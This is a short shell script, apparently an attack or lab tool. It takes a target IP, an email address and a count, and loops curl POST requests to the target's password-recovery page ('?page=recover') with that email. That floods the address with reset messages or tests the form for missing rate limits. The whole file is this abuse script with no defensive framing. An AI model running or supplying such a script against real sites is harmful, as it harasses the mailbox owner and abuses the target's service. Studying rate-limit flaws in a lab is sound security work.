#!/bin/sh

if [[ $# -ne 3 ]]; then
	echo usage: [IP] [mail] [number]
else
	for i in $(seq $3)
	do
		curl -X POST "http://$1/?page=recover" -F "mail=$2" -F "Submit=Submit"
	done
fi
